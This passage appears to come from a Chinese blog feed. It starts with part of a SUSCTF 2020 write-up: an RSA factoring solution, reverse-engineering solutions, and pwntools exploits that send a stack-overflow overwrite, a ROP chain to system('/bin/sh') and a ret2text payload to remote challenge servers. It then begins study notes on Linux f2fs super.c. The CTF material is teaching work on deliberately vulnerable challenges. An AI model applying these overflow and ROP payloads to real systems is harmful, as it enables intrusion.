class="function"><span class="keyword">def</span> <span class="title">Pollard_p_1</span>(<span class="params">N</span>):</span></span><br><span class="line">    a = <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = a</span><br><span class="line">        <span class="comment"># precompute</span></span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">80000</span>):</span><br><span class="line">            f = <span class="built_in">pow</span>(f, n, N)</span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">80000</span>, <span class="number">104729</span> + <span class="number">1</span>):</span><br><span class="line">            f = <span class="built_in">pow</span>(f, n, N)</span><br><span class="line">            <span class="keyword">if</span> n % <span class="number">15</span> == <span class="number">0</span>:</span><br><span class="line">                d = GCD(f - <span class="number">1</span>, N)</span><br><span class="line">                <span class="keyword">if</span> <span class="number">1</span> &lt; d &lt; N:</span><br><span class="line">                    <span class="keyword">return</span> d</span><br><span class="line">        <span class="built_in">print</span>(a)</span><br><span class="line">        a += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(Pollard_p_1(n1))</span></span><br><span class="line">p1 = <span class="number">23975730849019524224501133179102224796674075610246254128092570426422042826827752011251742168145817735504529147185472555701614948560936966981378192239399032009466320988235920811175788786979445565393611983841562134713850961292348331543316941450790337102298329241467860332089091772440405878425341499542277671695443</span></span><br><span class="line">q1 = n1 // p1</span><br><span class="line">d1 = invert(e1, (p1-<span class="number">1</span>)*(q1-<span class="number">1</span>))</span><br><span class="line"><span class="comment"># print(d1)</span></span><br><span class="line"><span class="comment"># d1 = 1290874390686504113800572548905624374916776782724975256433059733649402123331783485100866839214765709327051490890533906164789637167756002530899939477455484690947244496257304479081591111430374674711210201941039895188105776196200300051585789328908847443600121450707473374776889986080083458396462547926445074654616956992228117873470173124680591450377597400447728593106359737986839543880607109412876695735287787219432558567338918079968635213970201053049858159596886411010563653463432345037560562367605341086450175287814510703091118683130796239718226908370016179998972192219601416531060637529519864036298222311171029394100081</span></span><br><span class="line"></span><br><span class="line">hint = <span class="built_in">pow</span>(c1, d1, n1)</span><br><span class="line"><span class="comment"># print(hint)</span></span><br><span class="line"><span class="comment"># hint = 6447619334753222352642437426429858393559157103132369271461053517398729066459898239876515174356275892746233257614418880902563829997140350674866683206108482180467602522894155668424194920123827480635464864103765289832500322877007095569898442461637065138702513583894277315133366039750740029708723131396176433739505095125300759881683959288494017209369857877787318788348783910350463678400192419123716822673269223216260659356722683659879902069300190507155060239407696896030102443235801007815882499003540957722284061124180164977533909072687907196264536660791464489256384351443110635373913931349991593387041785791002589247321</span></span><br><span class="line"></span><br><span class="line">d2 = hack_RSA(hint, n2)</span><br><span class="line"><span class="comment"># print(d2)</span></span><br><span class="line">d2 = <span class="number">233</span></span><br><span class="line">flag = long_to_bytes(<span class="built_in">pow</span>(c2, d2, n2))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p><code>SUSCTF&#123;Sm0oTh_PQ_&amp;_Sma11_d&#125;</code></p>
<h4 id="Pwn-babync"><a href="#Pwn-babync" class="headerlink" title="[Pwn]babync"></a>[Pwn]babync</h4><h5 id="解题思路-13"><a href="#解题思路-13" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
<li>Ubuntn中<code>nc 146.56.223.95 20002</code>  </li>
<li><code>ls</code>然后<code>cat flag</code>即可</li>
</ol>
<h4 id="Pwn-babystack"><a href="#Pwn-babystack" class="headerlink" title="[Pwn]babystack"></a>[Pwn]babystack</h4><h5 id="解题思路-14"><a href="#解题思路-14" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
<li><p><code>checksec babystack</code>  </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little  </span><br><span class="line">    RELRO:    Full RELRO  </span><br><span class="line">    Stack:    Canary found  </span><br><span class="line">    NX:       NX enabled  </span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure></li>
<li><p>IDA64打开，<code>main()</code>有  </p>
</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 buf; <span class="comment">// [rsp+0h] [rbp-60h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+8h] [rbp-58h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+10h] [rbp-50h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+18h] [rbp-48h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+20h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">char</span> s1[<span class="number">8</span>]; <span class="comment">// [rsp+30h] [rbp-30h]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+38h] [rbp-28h]</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+40h] [rbp-20h]</span></span><br><span class="line">  __int64 v12; <span class="comment">// [rsp+48h] [rbp-18h]</span></span><br><span class="line">  __int64 v13; <span class="comment">// [rsp+50h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v14; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v14 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(_bss_start, <span class="number">0LL</span>);</span><br><span class="line">  buf = <span class="number">0LL</span>;</span><br><span class="line">  v5 = <span class="number">0LL</span>;</span><br><span class="line">  v6 = <span class="number">0LL</span>;</span><br><span class="line">  v7 = <span class="number">0LL</span>;</span><br><span class="line">  v8 = <span class="number">0LL</span>;</span><br><span class="line">  *(_QWORD *)s1 = <span class="number">0LL</span>;</span><br><span class="line">  v10 = <span class="number">0LL</span>;</span><br><span class="line">  v11 = <span class="number">0LL</span>;</span><br><span class="line">  v12 = <span class="number">0LL</span>;</span><br><span class="line">  v13 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Hello,I&#x27;m 1p0ch.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Leave something: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x50</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;btis_wants_girlfriends&quot;</span>) )</span><br><span class="line">    backdoor(s1, <span class="string">&quot;btis_wants_girlfriends&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>所以，只要<code>s1=&quot;btis_wants_girlfriends&quot;</code>即可，查看栈信息<br><img src="/2020/10/20/SUS2020/babystackbuf.png"><br>只要填充<code>&#39;a&#39;*0x30</code>即可覆盖到s1，因此有exp如下  </li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;146.56.223.95&#x27;</span>, <span class="number">20006</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">48</span> + <span class="string">&quot;btis_wants_girlfriends&quot;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="Pwn-babyrop"><a href="#Pwn-babyrop" class="headerlink" title="[Pwn]babyrop"></a>[Pwn]babyrop</h4><h5 id="解题思路-15"><a href="#解题思路-15" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
<li><p><code>checksec babyrop</code>  </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little  </span><br><span class="line">    RELRO:    Partial RELRO  </span><br><span class="line">    Stack:    No canary found  </span><br><span class="line">    NX:       NX enabled  </span><br><span class="line">    PIE:      No PIE (0x400000) </span><br></pre></td></tr></table></figure></li>
<li><p>IDA64打开，直接F5，<code>main()</code>  </p>
</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-60h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;buf, <span class="number">0</span>, <span class="number">0x60</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Such easy rop&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Leave something: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li><p>read存在栈溢出漏洞，填入0x68个’a’就可达返回地址，但是broken_backdoor只能<code>ls</code>，并不是我们想要的，所以需要构造ROP<br><a href="https://blog.csdn.net/michaelinfinity/article/details/88584349">类似题目</a>  </p>
</li>
<li><p>可通过IDA直接SHIFT+F12找到<code>/bin/sh</code>地址为0x601050<br><img src="/2020/10/20/SUS2020/babyropbin.png">  </p>
</li>
<li><p>函数窗口查看<code>_system()</code>地址0x400540<br><img src="/2020/10/20/SUS2020/babyropsys.png">  </p>
</li>
<li><p>因为传入一个参数，所以需要知道rdi地址，利用<code>ROPgadget --binary babyrop --only &#39;pop|ret&#39; | grep rdi</code>可得0x400763，所以先覆盖’a’再填入rdi再放binsh再加system即可执行  </p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;146.56.223.95&#x27;</span>, <span class="number">20007</span>)</span><br><span class="line">rdi = <span class="number">0x400763</span></span><br><span class="line">binsh = <span class="number">0x601050</span></span><br><span class="line">sys_addr = <span class="number">0x400540</span></span><br><span class="line">p.sendline(<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x60</span>+<span class="number">8</span>)+p64(rdi)+p64(binsh)+p64(sys_addr))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><code>SUSCTF&#123;29b76a5fedeb34b78d4284e896ced52f&#125;</code></p>
<h4 id="Pwn-babydoor"><a href="#Pwn-babydoor" class="headerlink" title="[Pwn]babydoor"></a>[Pwn]babydoor</h4><h5 id="解题思路-16"><a href="#解题思路-16" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
<li><p><code>checksec babydoor</code>  </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little  </span><br><span class="line">    RELRO:    Partial RELRO  </span><br><span class="line">    Stack:    No canary found  </span><br><span class="line">    NX:       NX enabled  </span><br><span class="line">    PIE:      No PIE (0x400000)  </span><br></pre></td></tr></table></figure></li>
<li><p>IDA64打开，F5，找到<code>main()</code>  </p>
</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-60h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(_bss_start, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;buf, <span class="number">0</span>, <span class="number">0x60</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Such easy ret2text&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Leave something: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x70</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>read存在栈溢出漏洞，传入<code>&#39;a&#39;*0x68</code>即可到达返回地址，exp如下  </li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;146.56.223.95&#x27;</span>, <span class="number">20008</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x68</span> + p64(<span class="number">0x400676</span>) + p64(<span class="number">0x4006fb</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="Pwn-snake"><a href="#Pwn-snake" class="headerlink" title="[Pwn]snake"></a>[Pwn]snake</h4><h5 id="解题思路-17"><a href="#解题思路-17" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
<li>ssh连上，<code>./snake</code>，然后就硬玩<br><img src="/2020/10/20/SUS2020/snake.png"></li>
</ol>
<h4 id="Reverse-迷宫"><a href="#Reverse-迷宫" class="headerlink" title="[Reverse]迷宫"></a>[Reverse]迷宫</h4><h5 id="解题思路-18"><a href="#解题思路-18" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
<li>在IDA中反编译后找到<br><img src="/2020/10/20/SUS2020/maze.png">  </li>
<li>猜测是个迷宫矩阵，故按8x8排列得到<br><img src="/2020/10/20/SUS2020/modimaze.png">  </li>
<li>所以出迷宫的方法是：LLLDDRDRRDDLLLD  </li>
<li><code>./babymaze</code>然后输入以上字符串得结果<br><code>SUSCTF&#123;DLLLDDRRDRDDLLLLLLDDRDRRDDLLLD&#125;</code>  </li>
</ol>
<h4 id="Reverse-表面"><a href="#Reverse-表面" class="headerlink" title="[Reverse]表面"></a>[Reverse]表面</h4><h5 id="解题思路-19"><a href="#解题思路-19" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
<li>用IDA打开，在<code>main()</code>中注意到有一个wrongans很可疑，查看一下，在其相邻的地方有<br><img src="/2020/10/20/SUS2020/rawBanner.png">  </li>
<li>这就很有意思了，太像一个Banner了，其中还有0x0AH的格式，猜想是需要重新调整格式得到想要的flag，用文本编辑器调一下即可，得到<br><img src="/2020/10/20/SUS2020/babysigninBanner.png">  </li>
<li>调整一下宽高明显点<br><img src="/2020/10/20/SUS2020/newBabysigninBanner.png"><br>所见即所得<br><code>SUS&#123;all_the_alphabets&#125;</code>  </li>
</ol>
<h4 id="Reverse-静置"><a href="#Reverse-静置" class="headerlink" title="[Reverse]静置"></a>[Reverse]静置</h4><h5 id="解题思路-20"><a href="#解题思路-20" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
<li>拖到IDA反编译，SHIFT+F12查看字符串<br><img src="/2020/10/20/SUS2020/babyre.png">  </li>
<li>查看mov<br><img src="/2020/10/20/SUS2020/babyremov.png">  </li>
<li>16进制转ASCII即可  </li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">lst = [<span class="number">0x53</span>, <span class="number">0x55</span>, <span class="number">0x53</span>, <span class="number">0x43</span>, <span class="number">0x54</span>, <span class="number">0x46</span>, <span class="number">0x7B</span>, <span class="number">0x57</span>, <span class="number">0x33</span>, <span class="number">0x6C</span>, <span class="number">0x63</span>, <span class="number">0x6F</span>, <span class="number">0x6D</span>, <span class="number">0x65</span>, <span class="number">0x5F</span>, <span class="number">0x74</span>, <span class="number">0x6F</span>, <span class="number">0x5F</span>,</span><br><span class="line">       <span class="number">0x53</span>, <span class="number">0x55</span>, <span class="number">0x53</span>, <span class="number">0x43</span>, <span class="number">0x54</span>, <span class="number">0x46</span>, <span class="number">0x5F</span>, <span class="number">0x32</span>, <span class="number">0x30</span>, <span class="number">0x32</span>, <span class="number">0x30</span>, <span class="number">0x5F</span>, <span class="number">0x52</span>, <span class="number">0x45</span>, <span class="number">0x23</span>, <span class="number">0x7D</span>]</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> lst:</span><br><span class="line">    flag += <span class="built_in">chr</span>(i)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p><code>SUSCTF&#123;W3lcome_to_SUSCTF_2020_RE#&#125;</code></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title>linux_f2fs_super_cp_recv</title>
    <url>/2020/02/29/linux-f2fs-super-cp-recv/</url>
    <content><![CDATA[<h1 id="Linux-v3-8-rc1"><a href="#Linux-v3-8-rc1" class="headerlink" title="Linux v3.8-rc1"></a>Linux v3.8-rc1</h1><h2 id="super-c"><a href="#super-c" class="headerlink" title="super.c"></a>super.c</h2><h3 id="f2fs-alloc-inode-从缓存中申请内存后，初始化具体的inode信息并设定标志，返回vfs-inode"><a href="#f2fs-alloc-inode-从缓存中申请内存后，初始化具体的inode信息并设定标志，返回vfs-inode" class="headerlink" title="f2fs_alloc_inode // 从缓存中申请内存后，初始化具体的inode信息并设定标志，返回vfs_inode"></a>f2fs_alloc_inode // 从缓存中申请内存后，初始化具体的inode信息并设定标志，返回vfs_inode</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* struct inode 和 struct super_block 在/include/linux/fs.h中*/</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> struct inode *<span class="title">f2fs_alloc_inode</span><span class="params">(struct super_block *sb)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">f2fs_inode_info</span> *<span class="title">fi</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 调用kmem_cache_alloc从缓存中申请内存。</span></span><br><span class="line"><span class="comment">     * f2fs_inode_cachep是可以指向任意kmem_cache类型的结构体指针</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * 内存分配掩码Get Free Page Mask</span></span><br><span class="line"><span class="comment">     * GFP_NOFS：分配内存时，禁止任何文件系统操作</span></span><br><span class="line"><span class="comment">     * __GFP_ZERO：分配器在分配成功时，将返回填充字节0的页</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    fi = kmem_cache_alloc(f2fs_inode_cachep, GFP_NOFS | __GFP_ZERO);</span><br><span class="line">    <span class="keyword">if</span> (!fi)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    init_once((<span class="keyword">void</span> *) fi);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Initilize f2fs-specific inode info */</span></span><br><span class="line">    fi-&gt;vfs_inode.i_version = <span class="number">1</span>;</span><br><span class="line">    atomic_set(&amp;fi-&gt;dirty_dents, <span class="number">0</span>);</span><br><span class="line">    fi-&gt;current_depth = <span class="number">1</span>;</span><br><span class="line">    fi-&gt;is_cold = <span class="number">0</span>;</span><br><span class="line">    rwlock_init(&amp;fi-&gt;ext.ext_lock);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设定索引节点的标志（FI_NEW_INODE为枚举类型，表明新分配的索引节点）</span></span><br><span class="line">    set_inode_flag(fi, FI_NEW_INODE);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> &amp;fi-&gt;vfs_inode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="f2fs-i-callback-进程结束后把进程信息存放到缓存中"><a href="#f2fs-i-callback-进程结束后把进程信息存放到缓存中" class="headerlink" title="f2fs_i_callback // 进程结束后把进程信息存放到缓存中"></a>f2fs_i_callback // 进程结束后把进程信息存放到缓存中</h3><p>调用<code>container_of</code>(macro在include/linux/kernel.h中)使指针head指向inode结构体的成员变量i_rcu, 把整个inode结构体的指针都存放在<code>struct inode *inode</code>，再调用<code>F2FS_I</code>函数通过inode指针指向f2fs_inode_info中的成员vfs_inode，通过inode指针返回结构体f2fs_inode_info的起始地址。然后调用<code>kmem_cache_free</code>函数把前面返回的结构体地址保存到f2fs_inode_cachep。</p>
<h3 id="f2fs-destroy-inode-销毁旧的inode指针"><a href="#f2fs-destroy-inode-销毁旧的inode指针" class="headerlink" title="f2fs_destroy_inode // 销毁旧的inode指针"></a>f2fs_destroy_inode // 销毁旧的inode指针</h3><h3 id="f2fs-put-super-释放内存"><a href="#f2fs-put-super-释放内存" class="headerlink" title="f2fs_put_super // 释放内存"></a>f2fs_put_super // 释放内存</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">f2fs_put_super</span><span class="params">(struct super_block *sb)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * F2FS_SB in /fs/f2fs/f2fs.h</span></span><br><span class="line"><span class="comment">     * 把sb指向结构体super_block的子数据s_fs_info指针并将其赋给sbi</span></span><br><span class="line"><span class="comment">     * s_fs_info指向特定文件系统的超级块信息</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">f2fs_sb_info</span> *<span class="title">sbi</span> =</span> F2FS_SB(sb);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_F2FS_STAT_FS <span class="comment">// 如果宏已经定义，则编译下面代码</span></span></span><br><span class="line">    <span class="keyword">if</span> (sbi-&gt;s_proc) &#123;</span><br><span class="line">        f2fs_stat_exit(sbi);</span><br><span class="line">        remove_proc_entry(sb-&gt;s_id, f2fs_proc_root);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    stop_gc_thread(sbi); <span class="comment">// 停止gc线程</span></span><br><span class="line"></span><br><span class="line">    write_checkpoint(sbi, <span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    iput(sbi-&gt;node_inode); <span class="comment">// 如果索引节点使用计数达到零，则索引节点将被释放或销毁</span></span><br><span class="line">    iput(sbi-&gt;meta_inode);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* destroy f2fs internal modules */</span></span><br><span class="line">    destroy_gc_manager(sbi);</span><br><span class="line">    destroy_node_manager(sbi);</span><br><span class="line">    destroy_segment_manager(sbi);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * kfree释放先前分配的内存</span></span><br><span class="line"><span class="comment">     * sbi-&gt;ckpt：kmalloc返回的指针。 如果sbi-&gt;ckpt为NULL，则不执行任何操作</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    kfree(sbi-&gt;ckpt);</span><br><span class="line"></span><br><span class="line">    sb-&gt;s_fs_info = <span class="literal">NULL</span>;</span><br><span class="line">    brelse(sbi-&gt;raw_super_buf);</span><br><span class="line">    kfree(sbi);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="f2fs-statfs-获取f2fs使用情况"><a href="#f2fs-statfs-获取f2fs使用情况" class="headerlink" title="f2fs_statfs // 获取f2fs使用情况"></a>f2fs_statfs // 获取f2fs使用情况</h3><p>如block大小和数目。可使用的有效block数目，有效的inode数目，有效的node数目</p>
<h3 id="f2fs-show-options-属性显示"><a href="#f2fs-show-options-属性显示" class="headerlink" title="f2fs_show_options // 属性显示"></a>f2fs_show_options // 属性显示</h3><p>如有操作，如“后台清理”、“关闭前滚”、“无堆分配”等情况出现，向seq流中写入相应的字符串如”,background_gc_on”</p>
<h3 id="parse-options-解析属性，与f2fs-show-options关联，认为两者与项目无关"><a href="#parse-options-解析属性，与f2fs-show-options关联，认为两者与项目无关" class="headerlink" title="parse_options // 解析属性，与f2fs_show_options关联，认为两者与项目无关"></a>parse_options // 解析属性，与f2fs_show_options关联，认为两者与项目无关</h3><h3 id="max-file-size-通过索引节点中的地址指针，直接块中的地址指针，间接块中的节点ID计算最大文件大小"><a href="#max-file-size-通过索引节点中的地址指针，直接块中的地址指针，间接块中的节点ID计算最大文件大小" class="headerlink" title="max_file_size // 通过索引节点中的地址指针，直接块中的地址指针，间接块中的节点ID计算最大文件大小"></a>max_file_size // 通过索引节点中的地址指针，直接块中的地址指针，间接块中的节点ID计算最大文件大小</h3><h3 id="sanity-check-raw-super-原始super的健全性检查"><a href="#sanity-check-raw-super-原始super的健全性检查" class="headerlink" title="sanity_check_raw_super // 原始super的健全性检查"></a>sanity_check_raw_super // 原始super的健全性检查</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">sanity_check_raw_super</span><span class="params">(struct f2fs_super_block *raw_super)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> blocksize;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查魔数magic是否为F2FS_SUPER_MAGIC</span></span><br><span class="line">    <span class="keyword">if</span> (F2FS_SUPER_MAGIC != le32_to_cpu(raw_super-&gt;magic))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    blocksize = <span class="number">1</span> &lt;&lt; le32_to_cpu(raw_super-&gt;log_blocksize);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 检查块大小和页大小是否一致（f2fs文件系统的设计上是一致的）</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (blocksize != PAGE_CACHE_SIZE)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="sanity-check-ckpt-checkpoint的健全性检查"><a href="#sanity-check-ckpt-checkpoint的健全性检查" class="headerlink" title="sanity_check_ckpt // checkpoint的健全性检查"></a>sanity_check_ckpt // checkpoint的健全性检查</h3><p>如果ckpt, sit, nat, ssa各自的segment数之和加上gc的保留段数 小于等于 segment总数，则通过健全性检查</p>
<h3 id="init-sb-info-对f2fs-sb-info进行初始化"><a href="#init-sb-info-对f2fs-sb-info进行初始化" class="headerlink" title="init_sb_info // 对f2fs_sb_info进行初始化"></a>init_sb_info // 对f2fs_sb_info进行初始化</h3><h3 id="f2fs-fill-super-读取磁盘的前端区域的数据，对F2FS元区域数据进行初始化"><a href="#f2fs-fill-super-读取磁盘的前端区域的数据，对F2FS元区域数据进行初始化" class="headerlink" title="f2fs_fill_super // 读取磁盘的前端区域的数据，对F2FS元区域数据进行初始化"></a>f2fs_fill_super // 读取磁盘的前端区域的数据，对F2FS元区域数据进行初始化</h3><p><code>f2fs_fill_super</code> 是加载F2FS文件系统的第一步，主要<strong>作用</strong>是读取磁盘的前端区域的数据，对F2FS元区域数据进行初始化。  </p>
<blockquote>
<p>1 首先调用<code>kzalloc</code>为特定f2fs的超级块信息分配内存<br>2 设定一个临时的块大小<br>3 调用<code>sb_bread</code>读取原始超级块的信息<br>4 调用<code>set_opt</code>初始化FS参数<br>5 调用<code>parse_options</code>解析安装属性<br>6 对原始super进行健全性检查<br>7 初始化特定的超级块信息，如用于gc, cp, write_inode, writepages的互斥量<br>8 调用<code>f2fs_iget</code>获取元空间的索引节点<br>9 对cp做健全性检查<br>10 调用<code>init_orphan_info</code>初始化超级块orphan信息<br>11 依次调用<code>build_segment_manager</code>, <code>build_node_manager</code>, <code>build_gc_manager</code>设置f2fs内部模块<br>12 调用<code>recover_orphan_inodes</code>恢复孤立节点，有则释放它们<br>13 调用<code>f2fs_iget</code>获取根索引节点和目录项<br>14 调用<code>recover_fsync_data</code>恢复（与数据的同步写入磁盘相关）<br>15 运行后台GC线程</p>
</blockquote>
<p>这个初始化函数中与后滚恢复相关的函数有<code>get_valid_checkpoint</code>和<code>build_segment_manager</code>,分别对应<code>f2fs_checkpoint</code>相关的数据和curseg相关的数据  </p>
<h4 id="get-valid-checkpoint-恢复f2fs-checkpoint"><a href="#get-valid-checkpoint-恢复f2fs-checkpoint" class="headerlink" title="get_valid_checkpoint // 恢复f2fs_checkpoint"></a>get_valid_checkpoint // 恢复<code>f2fs_checkpoint</code></h4><p><strong>定义</strong>在fs/f2fs/checkpoint.c中</p>
